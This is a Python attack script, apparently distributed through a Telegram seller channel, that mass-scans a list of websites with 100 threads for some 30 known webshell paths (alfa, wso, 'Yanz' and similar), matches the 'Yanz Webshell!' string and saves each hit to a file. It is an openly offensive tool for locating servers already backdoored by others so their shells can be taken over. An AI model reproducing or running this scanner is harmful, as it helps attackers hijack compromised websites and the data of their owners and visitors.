import sys
import requests
import re
import random
import string
from multiprocessing.dummy import Pool
from colorama import Fore, init

init(autoreset=True)
fr = Fore.RED
fg = Fore.GREEN

banner = '''
[#] Create By ::
	  ___                                                    ______        
>=>      >=>           >======>         >===>          >===>      >===>>=====> 
 >=>   >=>   >====>>=> >=>    >=>     >=>    >=>     >=>    >=>        >=>     
  >=> >=>         >=>  >=>    >=>   >=>        >=> >=>        >=>      >=>     
    >=>          >=>   >> >==>      >=>        >=> >=>        >=>      >=>     
  >=> >=>       >=>    >=>  >=>     >=>        >=> >=>        >=>      >=>     
 >=>   >=>      >=>    >=>    >=>     >=>     >=>    >=>     >=>       >=>     
>=>      >=>    >=>    >=>      >=>     >===>          >===>           >=>     
          ############## perv exploit joomla ##############                                                                     		 
	    Telegram Channels => https://t.me/x7seller						   
\n'''.format(fr)
print(banner)

requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def ran(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

Pathlist = [
    '/alfa-rex.php7', '/alfanew.php', '/wp-content/plugins/Cache/Cache.php', '/wp-admin/js/widgets/about.php7',
    '/wp-p.php7', '/wp-admin/repeater.php', '/wp-includes/repeater.php', '/wp-content/repeater.php', '/wsoyanz.php',
    '/yanz.php', '/wp-admin/js/about.php', '/wp-content/plugins/seoo/wsoyanz.php',
    '/wp-content/plugins/seoo/wsoyanz1.php', '/cache-compat.php', '/ajax-actions.php', '/wp-admin/ajax-actions.php',
    '/wp-consar.php', '/repeater.php', '/admin-post.php', '/wp-admin/maint/maint/ajax-actions.php',
    '/wp-admin/dropdown.php', '/wp-admin/css/index.php', '/dropdown.php', '/about.php', '/admin.php', '/about.php7',
    'alfanew.php7', '/adminfuns.php7', '/ebs.php7', '/ws.php7', '/alfanew2.php7', 'alfa-rex2.php7'
]

class EvaiLCode:
    def __init__(self):
        self.headers = {
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 '
                          '(KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'
        }
    
    def URLdomain(self, site):
        if site.startswith("http://"):
            site = site.replace("http://","")
        elif site.startswith("https://"):
            site = site.replace("https://","")
        else:
            pass
        pattern = re.compile('(.*)/')
        while re.findall(pattern,site):
            sitez = re.findall(pattern,site)
            site = sitez[0]
        return site
        
    def checker(self, site):
        try:
            url = "http://" + self.URLdomain(site)
            for Path in Pathlist:
                check = requests.get(url + Path, headers=self.headers, verify=False, timeout=25).content
                if "Yanz Webshell!" in check:
                    print('Target:{} --> {}[Succefully]'.format(url, fg))
                    open('Webshell!.txt', 'a').write(url + Path + "\n")
                    break
                else:
                    print('Target:{} -->! {}[Failid]'.format(url, fr))
        except Exception as e:
            print('Target:{} -->! {}[Error] {}'.format(url, fr, str(e)))

Control = EvaiLCode()

def RunUploader(site):
    try:
        Control.checker(site)
    except:
        pass

mp = Pool(100)
mp.map(RunUploader, target)
mp.close()
mp.join()
